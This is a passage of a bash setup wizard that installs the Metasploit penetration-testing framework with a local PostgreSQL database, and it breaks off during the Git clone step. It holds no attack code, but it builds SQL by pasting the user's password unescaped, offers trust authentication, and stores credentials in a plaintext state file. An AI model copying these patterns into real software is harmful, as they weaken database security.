#!/usr/bin/env bash
# ============================================================================
# Metasploit Framework Auto-Installer & Setup Wizard (Modular Version)
# ============================================================================
# This script installs and configures Metasploit Framework with PostgreSQL
# on Debian/Ubuntu, Fedora/RHEL, Arch, SUSE, and Termux.
#
# Modular Architecture:
#   - Core installer: this file (setup-metasploit.sh)
#   - Reference modules (sourced if available):
#       msf-cheatsheet.sh         → Quick command reference
#       msf-runbooks.sh           → Practical copy-paste runbooks
#       msf-pentest-framework.sh  → Professional 5-phase pentest framework
#
# Usage:
#   bash setup-metasploit.sh                  # Interactive wizard
#   bash setup-metasploit.sh --auto           # Non-interactive auto-setup
#   bash setup-metasploit.sh --check          # Pre-flight check only
#   bash setup-metasploit.sh --help           # Show help
#
# Author: MSF Setup Wizard
# Version: 2.0 (Modular)
# License: MIT
# ============================================================================

set -euo pipefail
IFS=$'\n\t'

#==============================================================================
# GLOBAL CONFIGURATION & DEFAULTS
#==============================================================================
SCRIPT_VERSION="2.0"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INTERACTIVE=true
STATE_FILE="$HOME/.msf-setup-state"

# --- Defaults (can be overridden via env vars or wizard) ---
MSF_INSTALL_DIR="${MSF_INSTALL_DIR:-$HOME/metasploit-framework}"
MSF_DIR="${MSF_DIR:-$HOME/.msf4}"
MSF_BRANCH="${MSF_BRANCH:-master}"
MSF_USER="${MSF_USER:-msf}"
MSF_DB="${MSF_DB:-msf}"
MSF_PASS="${MSF_PASS:-}"
PG_PORT="${PG_PORT:-5432}"
USE_PASSWORD="${USE_PASSWORD:-true}"

# --- PostgreSQL runtime variables (set by setup_postgresql) ---
PG_HOST="${PG_HOST:-127.0.0.1}"
PG_SUPERUSER="${PG_SUPERUSER:-}"
PG_SUPERUSER_PASS="${PG_SUPERUSER_PASS:-}"
PG_MODE="${PG_MODE:-}"
PG_DATA_DIR="${PG_DATA_DIR:-$HOME/.msf4/postgres}"
PG_RUNNING_PORT="${PG_RUNNING_PORT:-}"
HAS_PGISREADY=false

# --- Runtime detected ---
DISTRO_SLOT=-1
PKG_MGR=""
PKG_CHECK=""
INSTALL_DEPS=()

# --- Color & Formatting (fallback if not sourced from ref modules) ---
: "${RED:=\033[0;31m}"
: "${GREEN:=\033[0;32m}"
: "${YELLOW:=\033[1;33m}"
: "${BLUE:=\033[0;34m}"
: "${MAGENTA:=\033[0;35m}"
: "${CYAN:=\033[0;36m}"
: "${BOLD:=\033[1m}"
: "${DIM:=\033[2m}"
: "${NC:=\033[0m}"

#==============================================================================
# SOURCE EXTERNAL REFERENCE MODULES (if available)
#==============================================================================
# These modules provide: show_cheatsheet, show_postexploit_cheatsheet,
# run_runbook_menu, save_runbook_to_file, save_runbook_md_to_file,
# run_professional_framework_menu, print_professional_framework, etc.
for REF_FILE in \
    "$SCRIPT_DIR/msf-cheatsheet.sh" \
    "$SCRIPT_DIR/msf-runbooks.sh" \
    "$SCRIPT_DIR/msf-pentest-framework.sh"; do
    if [[ -f "$REF_FILE" ]]; then
        # shellcheck source=/dev/null
        source "$REF_FILE"
    fi
done

#==============================================================================
# HELPER FUNCTIONS
#==============================================================================
log() { echo -e "${GREEN}[✓]${NC} $*"; }
info() { echo -e "${BLUE}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err() { echo -e "${RED}[✗]${NC} $*" >&2; }
step() { echo -e "\n${CYAN}${BOLD}═══ $* ═══${NC}\n"; }

# --- Ask yes/no with default ---
ask_yesno() {
    local prompt="${1:-Continue?}"
    local default="${2:-y}"
    local yn="[y/N]"; [[ "$default" =~ ^[Yy]$ ]] && yn="[Y/n]"
    local reply
    read -r -p "  [?] ${prompt} ${yn}: " reply
    reply="${reply:-$default}"
    [[ "$reply" =~ ^[Yy]$ ]]
}

# --- Ask for input with default ---
ask_input() {
    local prompt="$1"
    local default="${2:-}"
    local reply
    read -r -p "  [?] ${prompt} [${default}]: " reply
    echo "${reply:-$default}"
}

# --- Ask for password (hidden input) ---
ask_password() {
    local prompt="${1:-Enter password}"
    local pass1 pass2
    while true; do
        read -r -s -p "  [?] ${prompt}: " pass1; echo
        read -r -s -p "  [?] Confirm: " pass2; echo
        [[ "$pass1" == "$pass2" ]] && { echo "$pass1"; return; }
        warn "Passwords don't match — try again"
    done
}

# --- Save state with safe quoting (KEY=VALUE format) ---
save_state() {
    cat > "$STATE_FILE" << EOF
MSF_INSTALL_DIR="$MSF_INSTALL_DIR"
MSF_DIR="$MSF_DIR"
MSF_BRANCH="$MSF_BRANCH"
MSF_USER="$MSF_USER"
MSF_DB="$MSF_DB"
MSF_PASS="$MSF_PASS"
PG_HOST="$PG_HOST"
PG_PORT="$PG_PORT"
PG_SUPERUSER="$PG_SUPERUSER"
PG_SUPERUSER_PASS="$PG_SUPERUSER_PASS"
PG_MODE="$PG_MODE"
PG_DATA_DIR="$PG_DATA_DIR"
DISTRO_SLOT="$DISTRO_SLOT"
PKG_MGR="$PKG_MGR"
USE_PASSWORD="$USE_PASSWORD"
SCRIPT_VERSION="$SCRIPT_VERSION"
EOF
    chmod 600 "$STATE_FILE"
}

# --- Load state if exists ---
load_state() {
    if [[ -f "$STATE_FILE" ]]; then
        # shellcheck source=/dev/null
        source "$STATE_FILE"
        log "Loaded previous setup state from ${STATE_FILE}"
    fi
}

#==============================================================================
# INTERACTIVE WIZARD — User Configuration
#==============================================================================
run_wizard() {
    step "Metasploit Setup Wizard v${SCRIPT_VERSION}"
    cat << WIZ

  This wizard will guide you through configuring Metasploit Framework
  with PostgreSQL database. You can accept defaults by pressing Enter.

  Installation will:
  1. Install system dependencies (Ruby, PostgreSQL, build tools)
  2. Configure PostgreSQL (detect existing or create new in home dir)
  3. Clone Metasploit Framework from GitHub
  4. Install Ruby gems via Bundler
  5. Create config files & launchers (msfconsole, msfvenom, msfdb)
  6. Verify installation

WIZ
    echo ""

    # --- Install directory ---
    MSF_INSTALL_DIR=$(ask_input "Metasploit install directory" "$MSF_INSTALL_DIR")
    MSF_DIR=$(ask_input "Metasploit config directory (~/.msf4)" "$MSF_DIR")

    # --- Database credentials ---
    echo ""
    echo -e "  ${BOLD}Database Configuration${NC}"
    if ask_yesno "Use password authentication for PostgreSQL?" "y"; then
        USE_PASSWORD="true"
        MSF_PASS=$(ask_password "PostgreSQL / Metasploit DB password")
        MSF_USER=$(ask_input "Database username" "$MSF_USER")
        MSF_DB=$(ask_input "Database name" "$MSF_DB")
    else
        USE_PASSWORD="false"
        MSF_PASS=""
        MSF_USER=$(ask_input "Database username (trust auth)" "$MSF_USER")
        MSF_DB=$(ask_input "Database name" "$MSF_DB")
    fi

    # --- Git branch ---
    echo ""
    MSF_BRANCH=$(ask_input "Metasploit Git branch (master = stable, or specific release tag)" "$MSF_BRANCH")

    # --- Confirm ---
    echo ""
    echo -e "  ${BOLD}Configuration Summary:${NC}"
    echo -e "    Install dir:  ${MSF_INSTALL_DIR}"
    echo -e "    Config dir:   ${MSF_DIR}"
    echo -e "    DB user:      ${MSF_USER}"
    echo -e "    DB name:      ${MSF_DB}"
    echo -e "    DB password:  $([[ -n "$MSF_PASS" ]] && echo "*****" || echo "(trust auth)")"
    echo -e "    Git branch:   ${MSF_BRANCH}"
    echo -e "    Auth mode:    $([[ "$USE_PASSWORD" == "true" ]] && echo "md5 (password)" || echo "trust")"
    echo ""
    if ! ask_yesno "Proceed with installation?" "y"; then
        info "Cancelled by user"
        exit 0
    fi
}

#==============================================================================
# DETECT ENVIRONMENT — OS, Package Manager, Existing PostgreSQL
#==============================================================================
detect_environment() {
    step "Detecting Environment"

    # --- OS / Distro ---
    if [[ -d "/data/data/com.termux" ]]; then
        DISTRO_SLOT=1  # Termux
        PKG_MGR="pkg"
        PKG_CHECK="dpkg"
        info "Termux detected"
    elif [[ -f /etc/os-release ]]; then
        . /etc/os-release
        case "${ID:-}" in
            ubuntu|debian|kali|linuxmint|pop|elementary|zorin|raspbian)
                DISTRO_SLOT=0
                PKG_MGR="apt"
                PKG_CHECK="dpkg"
                ;;
            fedora|rhel|centos|rocky|almalinux|ol)
                DISTRO_SLOT=2
                PKG_MGR="dnf"
                PKG_CHECK="rpm"
                command -v dnf &>/dev/null || PKG_MGR="yum"
                ;;
            arch|manjaro|endeavouros|garuda|arcolinux)
                DISTRO_SLOT=3
                PKG_MGR="pacman"
                PKG_CHECK="pacman"
                ;;
            opensuse*|sles)
                DISTRO_SLOT=4
                PKG_MGR="zypper"
                PKG_CHECK="rpm"
                ;;
            *)
                warn "Unknown distro: ${ID:-unknown} — assuming Debian/Ubuntu"
                DISTRO_SLOT=0
                PKG_MGR="apt"
                PKG_CHECK="dpkg"
                ;;
        esac
        info "Distro: ${PRETTY_NAME:-$ID} (slot: $DISTRO_SLOT, pkg: $PKG_MGR)"
    else
        warn "Cannot detect OS — assuming Debian/Ubuntu"
        DISTRO_SLOT=0
        PKG_MGR="apt"
        PKG_CHECK="dpkg"
    fi

    # --- Check existing PostgreSQL ---
    if command -v pg_isready &>/dev/null; then
        HAS_PGISREADY=true
        for p in 5432 5433 15432 54321; do
            if pg_isready -h 127.0.0.1 -p "$p" -q 2>/dev/null; then
                PG_RUNNING_PORT="$p"
                info "Found PostgreSQL running on port $p"
                break
            fi
        done
        # Also check Unix socket (Termux common)
        if [[ -z "${PG_RUNNING_PORT:-}" ]]; then
            if pg_isready -q 2>/dev/null; then
                PG_RUNNING_PORT="5432"
                info "Found PostgreSQL via Unix socket"
            fi
        fi
    elif command -v pg_ctl &>/dev/null; then
        # Try pg_ctl status on common data dirs
        for d in /var/lib/postgresql/*/main "$HOME/.msf4/postgres" "$HOME/db_data"; do
            if [[ -d "$d" ]] && pg_ctl -D "$d" status 2>/dev/null | grep -q "running"; then
                info "Found PostgreSQL running with data dir: $d"
                break
            fi
        done
    fi

    # --- Check required tools ---
    for tool in git curl; do
        command -v "$tool" &>/dev/null || INSTALL_DEPS+=("$tool")
    done
}

#==============================================================================
# INTERNAL: Package Management Helpers
#==============================================================================
_pkg_is_installed() {
    local pkg="$1"
    case "$PKG_CHECK" in
        dpkg) dpkg -s "$pkg" &>/dev/null 2>&1 ;;
        rpm)  rpm -q "$pkg" &>/dev/null 2>&1 ;;
        pacman) pacman -Q "$pkg" &>/dev/null 2>&1 ;;
        *) return 0 ;;  # Unknown mgr: assume installed to avoid reinstall loops
    esac
}

_pkg_available() {
    local pkg="$1"
    case "$PKG_MGR" in
        pkg)     pkg search "$pkg" 2>/dev/null | grep -q "^${pkg}/" ;;
        apt|apt-get) apt-cache show "$pkg" &>/dev/null 2>&1 ;;
        dnf)     dnf list "$pkg" &>/dev/null 2>&1 ;;
        yum)     yum list available "$pkg" &>/dev/null 2>&1 ;;
        zypper)  zypper search -x "$pkg" &>/dev/null 2>&1 ;;
        pacman)  pacman -Si "$pkg" &>/dev/null 2>&1 ;;
        *)       return 1 ;;
    esac
}

#==============================================================================
# PHASE 1 — Install System Dependencies
#==============================================================================
install_dependencies() {
    step "Phase 1: System Dependencies"

    # --- Package name mapping per distro ---
    declare -A PKG_MAP=(
        # [logical_name]="debian_pkg termux_pkg rhel_pkg arch_pkg"
        [ruby]="ruby ruby ruby ruby"
        [ruby-dev]="ruby-dev ruby-dev ruby-devel ruby"
        [postgresql]="postgresql postgresql postgresql-server postgresql"
        [postgresql-client]="postgresql-client postgresql postgresql postgresql"
        [postgresql-dev]="libpq-dev postgresql-dev postgresql-devel postgresql-libs"
        [git]="git git git git"
        [curl]="curl curl curl curl"
        [build-essential]="build-essential build-essential gcc make base-devel"
        [libpq-dev]="libpq-dev postgresql-dev postgresql-devel postgresql-libs"
        [libpcap-dev]="libpcap-dev libpcap libpcap-devel libpcap"
        [libssl-dev]="libssl-dev openssl-tool openssl-devel openssl"
        [zlib1g-dev]="zlib1g-dev zlib zlib-devel zlib"
        [libreadline-dev]="libreadline-dev readline readline-devel readline"
        [libsqlite3-dev]="libsqlite3-dev sqlite sqlite-devel sqlite"
        [libyaml-dev]="libyaml-dev libyaml libyaml-devel yaml"
        [libffi-dev]="libffi-dev libffi libffi-devel libffi"
        [libxml2-dev]="libxml2-dev libxml2 libxml2-devel libxml2"
        [libxslt1-dev]="libxslt1-dev libxslt libxslt-devel libxslt"
        [nmap]="nmap nmap nmap nmap"
        [net-tools]="net-tools net-tools net-tools net-tools"
        [iproute2]="iproute2 iproute2 iproute2 iproute2"
    )

    # --- Build package list ---
    local pkgs_to_install=""
    for logical_name in "${!PKG_MAP[@]}"; do
        local slot_pkg
        case $DISTRO_SLOT in
            0) slot_pkg="${PKG_MAP[$logical_name]%% *}" ;;
            1) slot_pkg="${PKG_MAP[$logical_name]#* }"; slot_pkg="${slot_pkg%% *}" ;;
            2) slot_pkg="${PKG_MAP[$logical_name]#* * }"; slot_pkg="${slot_pkg%% *}" ;;
            3) slot_pkg="${PKG_MAP[$logical_name]##* }" ;;
            *) slot_pkg="${PKG_MAP[$logical_name]%% *}" ;;
        esac
        [[ "$slot_pkg" == "-" ]] && continue

        # Handle comma-separated alternatives
        local selected="$slot_pkg"
        if [[ "$slot_pkg" == *,* ]]; then
            IFS=',' read -ra alts <<< "$slot_pkg"
            for alt in "${alts[@]}"; do
                if _pkg_available "$alt"; then
                    selected="$alt"; break
                fi
            done
        fi

        if ! _pkg_is_installed "$selected"; then
            pkgs_to_install="$pkgs_to_install $selected"
        fi
    done

    # --- PostgreSQL server ---
    local pg_server_pkg
    case $DISTRO_SLOT in
        0) pg_server_pkg="postgresql" ;;
        1) pg_server_pkg="postgresql" ;;
        2) pg_server_pkg="postgresql-server" ;;
        3) pg_server_pkg="postgresql" ;;
        4) pg_server_pkg="postgresql-server" ;;
    esac

    if ! command -v pg_ctl &>/dev/null || ! command -v initdb &>/dev/null; then
        if ! _pkg_is_installed "$pg_server_pkg"; then
            pkgs_to_install="$pkgs_to_install $pg_server_pkg"
        fi
    else
        log "PostgreSQL binaries found — skipping server package"
    fi

    pkgs_to_install=$(echo "$pkgs_to_install" | xargs)

    if [[ -z "$pkgs_to_install" ]]; then
        log "All system packages already installed"
    else
        info "Installing packages:$pkgs_to_install"
        echo ""

        case "$PKG_MGR" in
            pkg)
                pkg update -qq 2>/dev/null || warn "Repository update failed — continuing"
                for p in $pkgs_to_install; do
                    info "  Installing: $p"
                    pkg install -y "$p" 2>&1 | tail -5 || warn "Failed: $p (continuing)"
                done
                ;;
            apt|apt-get)
                $PKG_MGR update -qq 2>/dev/null || {
                    warn "Repository update failed"
                    [[ "$INTERACTIVE" == "true" ]] && ! ask_yesno "Continue without update?" "y" && exit 1
                }
                $PKG_MGR install -y $pkgs_to_install 2>&1 | tail -20 || {
                    warn "Some packages failed — trying individually"
                    for p in $pkgs_to_install; do
                        $PKG_MGR install -y "$p" 2>/dev/null || warn "  Failed: $p (skipping)"
                    done
                }
                ;;
            dnf|yum)
                $PKG_MGR install -y $pkgs_to_install 2>&1 | tail -20 || {
                    warn "Some packages failed — trying individually"
                    for p in $pkgs_to_install; do
                        $PKG_MGR install -y "$p" 2>/dev/null || warn "  Failed: $p (skipping)"
                    done
                }
                ;;
            zypper)
                zypper --non-interactive install $pkgs_to_install 2>&1 | tail -20 || {
                    warn "Some packages failed — trying individually"
                    for p in $pkgs_to_install; do
                        zypper --non-interactive install "$p" 2>/dev/null || warn "  Failed: $p (skipping)"
                    done
                }
                ;;
            pacman)
                pacman -Sy --noconfirm --needed $pkgs_to_install 2>&1 | tail -20 || {
                    warn "Some packages failed — trying individually"
                    for p in $pkgs_to_install; do
                        pacman -S --noconfirm --needed "$p" 2>/dev/null || warn "  Failed: $p (skipping)"
                    done
                }
                ;;
        esac
        log "Package installation phase complete"
    fi

    # --- Verify Ruby ---
    if ! command -v ruby &>/dev/null; then
        err "Ruby installation failed!"
        err "Install manually: ${PKG_MGR} install ruby ruby-dev"
        exit 1
    fi
    log "Ruby: $(ruby --version 2>&1 | head -c 50)"

    # --- Verify build tools ---
    for tool in gcc g++ make git curl; do
        command -v "$tool" &>/dev/null || warn "${tool} not found — may need manual install"
    done
}

#==============================================================================
# PHASE 2 — PostgreSQL Setup
#==============================================================================
setup_postgresql() {
    step "Phase 2: PostgreSQL Setup"

    PG_HOST="127.0.0.1"
    PG_DATA_DIR="$HOME/.msf4/postgres"

    # --- Guard: require psql ---
    if ! command -v psql &>/dev/null; then
        err "psql not found — PostgreSQL client not installed!"
        err "Install: ${PKG_MGR} install postgresql-client / postgresql"
        exit 1
    fi
    command -v pg_isready &>/dev/null && HAS_PGISREADY=true

    # --- Check for existing PostgreSQL ---
    if [[ -n "${PG_RUNNING_PORT:-}" ]]; then
        info "PostgreSQL already running on port ${PG_RUNNING_PORT}"

        # Try to find a working superuser
        for u in postgres "$USER" root admin u0_a306; do
            for d in template1 postgres template0; do
                if psql -h "$PG_HOST" -p "$PG_RUNNING_PORT" -U "$u" -d "$d" -c "SELECT 1" >/dev/null 2>&1; then
                    PG_SUPERUSER="$u"
                    PG_PORT="$PG_RUNNING_PORT"
                    PG_MODE="existing"
                    log "Using existing PostgreSQL — superuser: ${PG_SUPERUSER}"
                    break 2
                fi
            done
        done

        # Try without -U (peer/trust auth)
        if [[ "${PG_MODE:-}" != "existing" ]]; then
            for d in template1 postgres template0; do
                if psql -h "$PG_HOST" -p "$PG_RUNNING_PORT" -d "$d" -c "SELECT 1" >/dev/null 2>&1; then
                    PG_SUPERUSER=$(psql -h "$PG_HOST" -p "$PG_RUNNING_PORT" -d "$d" -tAc "SELECT current_user" 2>/dev/null || echo "unknown")
                    PG_PORT="$PG_RUNNING_PORT"
                    PG_MODE="existing"
                    log "Connected — current_user: ${PG_SUPERUSER}"
                    break
                fi
            done
        fi

        # Try Unix socket (Termux)
        if [[ "${PG_MODE:-}" != "existing" ]]; then
            for u in postgres "$USER"; do
                for d in template1 postgres template0; do
                    if psql -U "$u" -d "$d" -c "SELECT 1" >/dev/null 2>&1; then
                        PG_SUPERUSER="$u"
                        PG_PORT="5432"
                        PG_MODE="existing"
                        PG_HOST=""  # Unix socket: empty = default
                        log "Using PostgreSQL via Unix socket — superuser: ${PG_SUPERUSER}"
                        break 2
                    fi
                done
            done
            for d in template1 postgres template0; do
                if psql -d "$d" -c "SELECT 1" >/dev/null 2>&1; then
                    PG_SUPERUSER=$(psql -d "$d" -tAc "SELECT current_user" 2>/dev/null || echo "unknown")
                    PG_PORT="5432"
                    PG_MODE="existing"
                    PG_HOST=""
                    log "Connected via Unix socket — current_user: ${PG_SUPERUSER}"
                    break
                fi
            done
        fi
    fi

    # --- No existing PostgreSQL: create new in home dir ---
    if [[ "${PG_MODE:-}" != "existing" ]]; then
        echo ""
        echo -e "  ${YELLOW}${BOLD}  ╔══════════════════════════════════════════════════════╗${NC}"
        echo -e "  ${YELLOW}${BOLD}  ║     PostgreSQL — NEW SETUP FROM HOME DIRECTORY        ║${NC}"
        echo -e "  ${YELLOW}${BOLD}  ╚══════════════════════════════════════════════════════╝${NC}"
        echo ""

        info "No running PostgreSQL found — initializing new instance in home directory"
        info "Data directory: ${PG_DATA_DIR}"

        if [[ -f "${PG_DATA_DIR}/PG_VERSION" ]]; then
            warn "Data directory already exists at ${PG_DATA_DIR}"
            if [[ "$INTERACTIVE" == "true" ]] && ask_yesno "Use existing data directory?" "y"; then
                info "Using existing data directory"
            else
                warn "Remove ${PG_DATA_DIR} manually and re-run script"
                exit 1
            fi
        else
            info "Initializing PostgreSQL data directory..."
            echo ""

            mkdir -p "$PG_DATA_DIR"

            # Non-root initdb (root initdb fails)
            if [[ "$EUID" -eq 0 ]]; then
                warn "Running as root — initdb will fail. In real Termux you are NOT root."
                warn "Attempting initdb anyway (will fail in this container)..."
                initdb "$PG_DATA_DIR" 2>&1 | tail -15 || true
            else
                initdb "$PG_DATA_DIR" 2>&1 | tail -15
            fi

            if [[ ! -f "${PG_DATA_DIR}/PG_VERSION" ]]; then
                err "initdb failed!"
                if [[ "$EUID" -eq 0 ]]; then
                    err "CAUSE: Running as root. In real Termux (non-root) this works."
                    echo ""
                    info "Solution for real Termux:"
                    info "  1. Open Termux app (not root)"
                    info "  2. Run: pg_ctl -D ~/db_data -l logfile start"
                    info "  3. Re-run this script — will detect existing PostgreSQL"
                fi
                exit 1
            fi
        fi

        # --- Configure pg_hba.conf (backup if exists) ---
        if [[ -n "$MSF_PASS" ]]; then
            local AUTH_METHOD="md5"
        else
            local AUTH_METHOD="trust"
        fi

        if [[ -f "${PG_DATA_DIR}/pg_hba.conf" ]]; then
            cp "${PG_DATA_DIR}/pg_hba.conf" "${PG_DATA_DIR}/pg_hba.conf.bak.$(date +%s)"
            info "Backed up existing pg_hba.conf"
        fi

        cat > "${PG_DATA_DIR}/pg_hba.conf" << HBACONF
# PostgreSQL HBA — generated by MSF Setup Wizard
local   all     all                         ${AUTH_METHOD}
host    all     all         127.0.0.1/32    ${AUTH_METHOD}
host    all     all         ::1/128         ${AUTH_METHOD}
HBACONF

        # --- Start PostgreSQL ---
        info "Starting PostgreSQL..."
        pg_ctl -D "$PG_DATA_DIR" -l "${PG_DATA_DIR}/pg.log" start 2>&1 || {
            err "pg_ctl start failed!"
            err "Check log: cat ${PG_DATA_DIR}/pg.log"
            exit 1
        }

        # Wait for ready
        local pg_started=false
        for i in $(seq 1 30); do
            if [[ "$HAS_PGISREADY" == "true" ]]; then
                if pg_isready -p "$PG_PORT" -q 2>/dev/null; then pg_started=true; break; fi
            else
                if psql -p "$PG_PORT" -d postgres -c "SELECT 1" &>/dev/null; then pg_started=true; break; fi
            fi
            sleep 1
        done

        if [[ "$pg_started" == "true" ]]; then
            log "PostgreSQL started on ${PG_HOST:-localhost}:${PG_PORT}"
        else
            err "PostgreSQL failed to start after 30 seconds!"
            err "Check log: cat ${PG_DATA_DIR}/pg.log"
            exit 1
        fi

        # Superuser = OS user
        PG_SUPERUSER="$(whoami)"
        PG_MODE="home"
        PG_SUPERUSER_PASS=""

        # --- Helper scripts: pg-start, pg-stop ---
        mkdir -p "$HOME/bin"

        cat > "$HOME/bin/pg-start" << 'PGSTART'
#!/usr/bin/env bash
# Start PostgreSQL from home directory (generated by MSF Setup Wizard)
set -euo pipefail
DATA_DIR="{{PG_DATA_DIR}}"
PG_HOST="{{PG_HOST}}"
PG_PORT="{{PG_PORT}}"

if [[ ! -f "${DATA_DIR}/PG_VERSION" ]]; then
    echo "[✗] Data directory ${DATA_DIR} not valid (no PG_VERSION)"
    echo "[*] Run setup-metasploit.sh first to initialize"
    exit 1
fi

if ! command -v pg_ctl &>/dev/null; then
    echo "[✗] pg_ctl not found — PostgreSQL server not installed"
    exit 1
fi

cd "$HOME"
pg_ctl -D "${DATA_DIR}" -l "${DATA_DIR}/pg.log" start 2>/dev/null || {
    echo "[✗] Failed to start PostgreSQL — check log: ${DATA_DIR}/pg.log"
    exit 1
}

# Wait until ready
for i in $(seq 1 15); do
    if command -v pg_isready &>/dev/null; then
        pg_isready -p "${PG_PORT}" -q 2>/dev/null && break
    else
        psql -p "${PG_PORT}" -d postgres -c "SELECT 1" &>/dev/null && break
    fi
    sleep 1
done

if command -v pg_isready &>/dev/null; then
    pg_isready -p "${PG_PORT}" -q && echo "[✓] PostgreSQL ready on ${PG_HOST:-localhost}:${PG_PORT}" || echo "[✗] Failed — check log"
else
    echo "[✓] PostgreSQL started (verified via psql)"
fi
PGSTART

        cat > "$HOME/bin/pg-stop" << 'PGSTOP'
#!/usr/bin/env bash
# Stop PostgreSQL from home directory (generated by MSF Setup Wizard)
DATA_DIR="{{PG_DATA_DIR}}"

if ! command -v pg_ctl &>/dev/null; then
    echo "[✗] pg_ctl not found"
    exit 1
fi

if [[ ! -f "${DATA_DIR}/PG_VERSION" ]]; then
    echo "[*] No PostgreSQL data directory — nothing to stop"
    exit 0
fi

pg_ctl -D "${DATA_DIR}" stop 2>/dev/null && echo "[✓] PostgreSQL stopped" || {
    if pg_ctl -D "${DATA_DIR}" status 2>/dev/null | grep -q "server is running"; then
        echo "[✗] Failed to stop — try: pg_ctl -D ${DATA_DIR} stop -m fast"
    else
        echo "[*] PostgreSQL not running"
    fi
}
PGSTOP

        # Substitute placeholders
        sed -i "s|{{PG_DATA_DIR}}|${PG_DATA_DIR}|g" "$HOME/bin/pg-start"
        sed -i "s|{{PG_HOST}}|${PG_HOST:-}|g" "$HOME/bin/pg-start"
        sed -i "s|{{PG_PORT}}|${PG_PORT}|g" "$HOME/bin/pg-start"
        sed -i "s|{{PG_DATA_DIR}}|${PG_DATA_DIR}|g" "$HOME/bin/pg-stop"
        chmod +x "$HOME/bin/pg-start" "$HOME/bin/pg-stop"

        log "Helper scripts: ~/bin/pg-start, ~/bin/pg-stop"
    fi

    # --- Create Metasploit user & database ---
    echo ""
    info "Creating Metasploit user & database..."

    local PSQL_CMD
    if [[ "$PG_MODE" == "existing" ]]; then
        if [[ -z "$PG_HOST" ]]; then  # Unix socket
            PSQL_CMD="psql -U ${PG_SUPERUSER} -d template1"
        else
            PSQL_CMD="psql -h ${PG_HOST} -p ${PG_PORT} -U ${PG_SUPERUSER} -d template1"
        fi
    else
        PSQL_CMD="psql -p ${PG_PORT} -d postgres"
    fi

    # Create role
    if $PSQL_CMD -tAc "SELECT 1 FROM pg_roles WHERE rolname='${MSF_USER}'" 2>/dev/null | grep -q 1; then
        log "Role '${MSF_USER}' already exists"
        if [[ -n "$MSF_PASS" ]]; then
            $PSQL_CMD -c "ALTER ROLE ${MSF_USER} PASSWORD '${MSF_PASS}'" 2>/dev/null || true
            log "Password updated"
        fi
    else
        if [[ -n "$MSF_PASS" ]]; then
            $PSQL_CMD -c "CREATE ROLE ${MSF_USER} LOGIN PASSWORD '${MSF_PASS}'" 2>/dev/null || {
                warn "Failed to create role with password — trying without"
                $PSQL_CMD -c "CREATE ROLE ${MSF_USER} LOGIN" 2>/dev/null || { err "Failed to create role ${MSF_USER}"; exit 1; }
            }
        else
            $PSQL_CMD -c "CREATE ROLE ${MSF_USER} LOGIN" 2>/dev/null || { err "Failed to create role ${MSF_USER}"; exit 1; }
        fi
        log "Role '${MSF_USER}' created"
    fi

    # Create database
    if $PSQL_CMD -tAc "SELECT 1 FROM pg_database WHERE datname='${MSF_DB}'" 2>/dev/null | grep -q 1; then
        log "Database '${MSF_DB}' already exists"
    else
        $PSQL_CMD -c "CREATE DATABASE ${MSF_DB} OWNER ${MSF_USER}" 2>/dev/null || { err "Failed to create database ${MSF_DB}"; exit 1; }
        log "Database '${MSF_DB}' created"
    fi

    $PSQL_CMD -c "GRANT ALL PRIVILEGES ON DATABASE ${MSF_DB} TO ${MSF_USER}" 2>/dev/null || true

    # --- Test connection ---
    local TEST_OK=false
    if [[ -n "$MSF_PASS" ]]; then
        if [[ -z "$PG_HOST" ]]; then
            if PGPASSWORD="$MSF_PASS" psql -U "$MSF_USER" -d "$MSF_DB" -c "SELECT 1" >/dev/null 2>&1; then
                log "Connection verified ✓ (password auth, unix socket)"; TEST_OK=true
            fi
        else
            if PGPASSWORD="$MSF_PASS" psql -h "$PG_HOST" -p "$PG_PORT" -U "$MSF_USER" -d "$MSF_DB" -c "SELECT 1" >/dev/null 2>&1; then
                log "Connection verified ✓ (password auth)"; TEST_OK=true
            fi
        fi
    fi
    if [[ "$TEST_OK" != "true" ]]; then
        if [[ -z "$PG_HOST" ]]; then
            if psql -U "$MSF_USER" -d "$MSF_DB" -c "SELECT 1" >/dev/null 2>&1; then
                log "Connection verified ✓ (trust auth, unix socket)"; TEST_OK=true
            fi
        else
            if psql -h "$PG_HOST" -p "$PG_PORT" -U "$MSF_USER" -d "$MSF_DB" -c "SELECT 1" >/dev/null 2>&1; then
                log "Connection verified ✓ (trust auth)"; TEST_OK=true
            fi
        fi
    fi

    if [[ "$TEST_OK" != "true" ]]; then
        warn "Connection test failed — trying grant schema public..."
        $PSQL_CMD -c "GRANT ALL ON SCHEMA public TO ${MSF_USER}" 2>/dev/null || true
        sleep 1
        if psql -h "${PG_HOST:-127.0.0.1}" -p "$PG_PORT" -U "$MSF_USER" -d "$MSF_DB" -c "SELECT 1" >/dev/null 2>&1; then
            log "Connection fixed ✓"
        else
            warn "Still failing — can try manually in msfconsole later"
        fi
    fi
}

#==============================================================================
# PHASE 3 — Install Metasploit Framework (Git Clone)
#==============================================================================
install_metasploit() {
    step "Phase 3: Metasploit Framework"

    if ! command -v git &>/dev/null; then
        err "git not available — cannot clone Metasploit"
        err "Install: ${PKG_MGR} install git"
        exit 1
    fi

    # --- Existing repo: update ---
    if [[ -d "${MSF_INSTALL_DIR}/.git" ]]; then
        info "Repository exists at ${MSF_INSTALL_DIR} — updating..."
        cd "$MSF_INSTALL_DIR" || exit 1

        git stash save "msf-setup-auto-stash-$(date +%s)" 2>/dev/null || true
        git fetch --all --prune 2>/dev/null || { warn "git fetch failed — using existing code"; return 0; }

        if git rev-parse --verify "$MSF_BRANCH" &>/dev/null; then
            git checkout "$MSF_BRANCH" 2>/dev/null || warn "Failed to checkout ${MSF_BRANCH} — staying on current branch"
        else
            warn "Branch '${MSF_BRANCH}' not found — using master"
            git checkout master 2>/dev/null || true
        fi

        git pull origin "$MSF_BRANCH" 2>/dev/null || warn "git pull failed — continuing with existing code"
        log "Metasploit source updated: ${MSF_INSTALL_DIR}"
        return 0
    fi

    # --- Existing non-git dir: backup ---
    if [[ -d "$MSF_INSTALL_DIR" ]]; then
        local bak="${MSF_INSTALL_DIR}.bak.$(date +%s)"
        warn "Existing non-git directory at ${MSF_INSTALL_DIR} — backing up to ${bak}"
        mv "$MSF_INSTALL_DIR" "$bak" 2>/dev/null || { err "Backup failed"; exit 1; }
        log "Backup OK: ${bak}"
    fi

    # --- Fresh clone ---
    mkdir -p "$(dirname "$MSF_INSTALL_DIR")" 2>/dev/null || true

    echo ""
